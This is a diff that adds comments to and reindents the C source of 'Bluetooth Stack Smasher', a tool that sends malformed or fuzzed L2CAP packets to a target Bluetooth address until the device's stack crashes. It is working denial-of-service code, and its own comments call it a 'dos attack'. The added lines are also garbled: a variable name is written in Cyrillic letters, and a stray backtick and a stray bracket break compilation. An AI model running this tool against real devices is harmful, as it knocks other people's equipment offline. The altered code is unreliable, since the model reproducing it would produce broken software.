@@ -53,81 +53,105 @@ void l2dos(char *, int, int, char);
 void l2fuzz(char *bdstr_addr, int maxsize, int maxcrash);
 char *code2define(int code);
 
+////// l2dos //////
+//////////////////////////////////////////////////////////////////////
+// Description: Function to fuzz the Bluetooth L2CAP service with a given command.
+//////////////////////////////////////////////////////////////////////
 void l2dos(char *bdstr_addr, int cmdnum, int siz, char pad)
 {
-	char *buf;
-	l2cap_cmd_hdr *cmd;		/* struct detailed in /usr/include/bluetooth/l2cap.h */
-	struct sockaddr_l2 addr;
-	int sock, i, id;
-	char *strcode = NULL;
-	
-	if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
-		perror("socket");
-		exit(EXIT_FAILURE);
-	}
+	////////// Local Variables //////////////
+///////////////////////////////////////////////////////////////////////
+// buf: Buffer to hold l2cap command header and payload
+// cmd: Pointer to l2cap command header structure
+// addr: Local Bluetooth address for binding and connecting
+// sock: File descriptor for the L2CAP socket
+// i: Loop counter
+// id: Identifier for the command
+// strcode: Pointer to the code string from code2define function
+///////////////////////////////////////////////////////////////////////
 
-	memset(&addr, 0, sizeof(addr));
-	addr.l2_family = AF_BLUETOOTH;
-	if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
-		perror("bind");
-		exit(EXIT_FAILURE);
-	}
+    char *buf;
+    l2cap_cmd_hdr *cmd;		/* struct detailed in /usr/include/bluetooth/l2cap.h */
+    struct sockaddr_l2 addr;
+    int sock, i, id;
+    char *strcode = NULL;
+    
+    if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
+        perror("socket");
+        exit(EXIT_FAILURE);
+    }
 
-	str2ba(bdstr_addr, &addr.l2_bdaddr);
-	if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
-		perror("connect");
-		exit(EXIT_FAILURE);
-	}
+    // Set the destination Bluetooth address
+    memset(&addr, 0, sizeof(addr));
+    addr.l2_family = AF_BLUETOOTH;
+    if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
+        perror("bind");
+        exit(EXIT_FAILURE);
+    }
 
-	if(!(buf = (char *) malloc ((int) siz))) {
-		perror("malloc");
-		exit(EXIT_FAILURE);
-	}
+    // Convert the Bluetooth device address from string format to binary format
+    str2ba(bdstr_addr, &addr.l2_bdaddr);
+    if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
+        perror("connect");
+        exit(EXIT_FAILURE);
+    }
 
-	for(i = L2CAP_CMD_HDR_SIZE; i < siz; i++)
-	{
-		if( pad == 0 )
-			buf[i] = 0x41;		/* Default padding byte */
-		else
-			buf[i] = pad;
-	}
-	
-	fprintf(stdout, "size = %d\n",siz);
-	strcode = code2define(cmdnum);
-	if(strcode == NULL)
-	{
-		perror("L2CAP command unknown");
-		exit(EXIT_FAILURE);
-	}
-	else
-		fprintf(stdout, "Performing \"%s\" fuzzing...\n",strcode);
+    // Allocate memory for the buffer
+    if(!(buf = (char *) malloc ((int) siz))){
+        perror("malloc");
+        exit(EXIT_FAILURE);
+    }
 
-	for(i = 0; i < IT; i++){			// Send IT times the packet thru the air
-		cmd = (l2cap_cmd_hdr *) buf;
-		cmd->code = cmdnum;
-		cmd->ident = (i%250) + 1;		// Identificator 
-		cmd->len = __cpu_to_le16(LENGTH);
+    // Pad the buffer with a default byte or the specified padding byte
+    for(i = L2CAP_CMD_HDR_SIZE; i < siz; i++)
+    {
+        if( pad == 0 )
+            buf[i] = 0x41;		/* Default padding byte */
+        else
+            buf[i] = pad;
+    }
+    
+    // Print the size of the buffer
+    fprintf(stdout, "size = %d\n",sіз);
+    strcode = code2define(cmdnum);
+    if(strcode == NULL)
+    {
+        perror("L2CAP command unknown");
+        exit(EXIT_FAILURE);
+    }
+    else
+        fprintf(stdout, "Performing \"%s\" fuzzing...\n",strcode);
 
-		putchar('.');
-		fflush(stdout);
-		
-		if(send(sock, buf, siz?siz:MAXSIZE, 0) <= 0)
-		{
-			fprintf(stdout, "\n%s BT stack may have crashed. This device seems to be vulnerable to buggy %s packets.\n", bdstr_addr, strcode);
-			fprintf(stdout, "Please, ensure that the device has really crashed doing a bt scan for instance.\n");
-			fprintf(stdout, "\t ----------------------------------------------------\n");
-			fprintf(stdout, "\t Host\t\t%s\n", bdstr_addr);
-			fprintf(stdout, "\t Code field\t%s\n", strcode);
-			fprintf(stdout, "\t Ident field\t%d\n", id);
-			fprintf(stdout, "\t Length field\t%d\n", __cpu_to_le16(LENGTH));
-			fprintf(stdout, "\t Packet size\t%d\n", siz);
-			fprintf(stdout, "\t ----------------------------------------------------\n");
-		}
-		if(++id > 254)
-			id = 1;
-	}
+    // Send the fuzzing packets IT times
+    for(i = 0; i < IT; i++){
+        // Convert the buffer to an l2cap command header
+        cmd = (l2cap_cmd_hdr *) buf;
+        cmd->code = cmdnum;
+        cmd->ident = (i%250) + 1;		// Identificator 
+        cmd->len = __cpu_to_le16(LENGTH);
 
-	free(strcode);	
+        // Display a progress bar
+        putchar('.');
+        fflush(stdout);
+
+        // Send the packet over the L2CAP socket
+        if(send(sock, buf, siz?siz:MAXSIZE, 0) <= 0)
+        {
+            fprintf(stdout, "\n%s BT stack may have crashed. This device seems to be vulnerable to buggy %s packets.\n", bdstr_addr, strcode);
+            fprintf(stdout, "Please, ensure that the device has really crashed doing a bt scan for instance.\n");
+            fprintf(stdout, "\t ----------------------------------------------------\n");
+            fprintf(stdout, "\t Host\t\t%s\n", bdstr_addr);
+            fprintf(stdout, "\t Code field\t%s\n", strcode);
+            fprintf(stdout, "\t Ident field\t%d\n", id);
+            fprintf(stdout, "\t Length field\t%d\n", __cpu_to_le16(LENGTH));
+            fprintf(stdout, "\t Packet size\t%d\n", siz);
+            fprintf(stdout, "\t ----------------------------------------------------\n");
+        }
+        if(++id > 254)
+            id = 1;
+    }
+
+    free(strcode);
 }
 
 void l2fuzz(char *bdstr_addr, int maxsize, int maxcrash)
@@ -215,6 +239,10 @@ void l2fuzz(char *bdstr_addr, int maxsize, int maxcrash)
 	}
 }
 
+`/* 
+ Function: usage(char *name)
+ Prints usage message to standard error and exits.
+ */
 int usage(char *name)
 {
 	fprintf(stderr, "BSS: Bluetooth Stack Smasher\n");
@@ -237,117 +265,136 @@ int usage(char *name)
 }
 
 
+/**
+ * Convert a L2CAP code to a human-readable string.
+ * 
+ * @param code the L2CAP code to convert
+ * @return a pointer to a dynamically allocated string representing the human-readable equivalent of the input code, or NULL if the code is not recognized
+ */
 char *code2define(int code)
 {
-	char *strcode= malloc(BUFCODE + 1);
+[char *strcode= malloc(BUFCODE + 1);
 	switch(code)
 	{
 		case L2CAP_ECHO_REQ:
+			// Translate L2CAP echo request code to a human-readable string
 			strcpy(strcode, "L2CAP echo request");	
 			break;
 
 		case L2CAP_COMMAND_REJ:
+			// Translate L2CAP command reject code to a human-readable string
 			strcpy(strcode, "L2CAP command reject");	
 			break;
 			
 		case L2CAP_CONN_REQ:
+			// Translate L2CAP connection request code to a human-readable string
 			strcpy(strcode, "L2CAP connection request");	
 			break;
 			
 		case L2CAP_CONN_RSP:
+			// Translate L2CAP connexion response code to a human-readable string
 			strcpy(strcode, "L2CAP connexion response");	
 			break;
 			
 		case L2CAP_CONF_REQ:
+			// Translate L2CAP configuration request code to a human-readable string
 			strcpy(strcode, "L2CAP configuration request");	
 			break;
 			
 		case L2CAP_CONF_RSP:
+			// Translate L2CAP configuration response code to a human-readable string
 			strcpy(strcode, "L2CAP configuration response");	
 			break;
 			
 		case L2CAP_DISCONN_REQ:
+			// Translate L2CAP disconnection request code to a human-readable string
 			strcpy(strcode, "L2CAP disconnection request");	
 			break;
 			
 		case L2CAP_DISCONN_RSP:
+			// Translate L2CAP disconnection response code to a human-readable string
 			strcpy(strcode, "L2CAP disconnection response");	
 			break;
 			
 		case L2CAP_ECHO_RSP:
+			// Translate L2CAP echo response code to a human-readable string
 			strcpy(strcode, "L2CAP echo response");	
 			break;
 			
 		case L2CAP_INFO_REQ:
+			// Translate L2CAP info request code to a human-readable string
 			strcpy(strcode, "L2CAP info request");	
 			break;
 			
 		case L2CAP_INFO_RSP:
+			// Translate L2CAP info response code to a human-readable string
 			strcpy(strcode, "L2CAP info response");	
 			break;
 			
 		default:
+			// Return NULL if the input code is not recognized
 			strcode=NULL;
 	}
 	return strcode;
 }
 
+// main function: parses command line arguments and executes Bluetooth device fuzzing or dos attack
 int main(int argc, char **argv)
 {
-	int i, siz = 0, mode = 0, maxcrash=1;
-	char bdaddr[20], pad=0;
+    int i, siz = 0, mode = 0, maxcrash=1;
+    char bdaddr[20], pad=0;
 
-	if(getuid() != 0)
-	{
-		fprintf(stderr, "You need to be root to launch %s (raw socket)\n", argv[0]);
-		exit(EXIT_FAILURE);
-	}
-	
-	if(argc < 2 || argc > 9)
-	{
-		usage(argv[0]);
-	}
-	
-	for(i = 0; i < argc; i++){
-		if(strchr(argv[i], ':'))
-			strncpy(bdaddr, argv[i], 18);
-		else
-		{
-		if(!memcmp(argv[i], "-s", 2) && (siz = atoi(argv[++i])) < 0)
-			usage(argv[0]);
-		
-		if(!memcmp(argv[i], "-m", 2) && (mode = atoi(argv[++i])) < 0)
-			usage(argv[0]);
-		
-		if(!memcmp(argv[i], "-p", 2) && (pad = (*argv[++i])) < 0)
-			usage(argv[0]);
-		
-		if(!memcmp(argv[i], "-M", 2) && (maxcrash = atoi(argv[++i])) < 0)
-			usage(argv[0]);
+    if(getuid() != 0)        // check if the user is running with root privileges
+    {
+        fprintf(stderr, "You need to be root to launch %s (raw socket)\n", argv[0]);
+        exit(EXIT_FAILURE);
+    }
 
-		}
-	}
+    if(argc < 2 || argc > 9)        // check the number of command line arguments
+    {
+        usage(argv[0]);
+    }
 
-	if(mode > 12)
-	{
-		usage(argv[0]);
-		exit(EXIT_FAILURE);
-	}
+    for(i = 0; i < argc; i++){
+        if(strchr(argv[i], ':'))    // if the argument contains a colon, it is a Bluetooth device address
+            strncpy(bdaddr, argv[i], 18);
+        else
+        {
+            if(!memcmp(argv[i], "-s", 2) && (siz = atoi(argv[++i])) < 0)    // parse -s option
+                usage(argv[0]);
 
-	if(mode == 0)
-	{
-		for(i=1; i <= 0x0b; i++)
-			l2dos(bdaddr, i, siz?siz:MAXSIZE, pad);
-		l2fuzz(bdaddr, siz?siz:MAXSIZE, maxcrash);
-	}
-	else
-	{
-		if(mode <= 11)
-			l2dos(bdaddr, mode, siz?siz:MAXSIZE, pad);
-		if(mode == 12)
-			l2fuzz(bdaddr, siz?siz:MAXSIZE, maxcrash);
-	}
-	fprintf(stdout, "\nYour bluetooth device didn't crash receiving the packets\n");
-	
-	return EXIT_SUCCESS;
+            if(!memcmp(argv[i], "-m", 2) && (mode = atoi(argv[++i])) < 0)    // parse -m option
+                usage(argv[0]);
+
+            if(!memcmp(argv[i], "-p", 2) && (pad = (*argv[++i])) < 0)    // parse -p option
+                usage(argv[0]);
+
+            if(!memcmp(argv[i], "-M", 2) && (maxcrash = atoi(argv[++i])) < 0)    // parse -M option
+                usage(argv[0]);
+
+        }
+    }
+
+    if(mode > 12)        // check if the mode is valid
+    {
+        usage(argv[0]);
+        exit(EXIT_FAILURE);
+    }
+
+    if(mode == 0)        // execute Bluetooth device fuzzing
+    {
+        for(i=1; i <= 0x0b; i++)
+            l2dos(bdaddr, i, siz?siz:MAXSIZE, pad);    // fuzz Bluetooth device with L2 dos attack
+        l2fuzz(bdaddr, siz?siz:MAXSIZE, maxcrash);    // fuzz Bluetooth device with L2 fuzz attack
+    }
+    else        // execute Bluetooth device dos attack
+    {
+        if(mode <= 11)
+            l2dos(bdaddr, mode, siz?siz:MAXSIZE, pad);    // perform L2 dos attack on Bluetooth device
+        if(mode == 12)
+            l2fuzz(bdaddr, siz?siz:MAXSIZE, maxcrash);    // fuzz Bluetooth device with L2 fuzz attack
+    }
+    fprintf(stdout, "\nYour bluetooth device didn't crash receiving the packets\n");    // print success message
+
+    return EXIT_SUCCESS;
 }
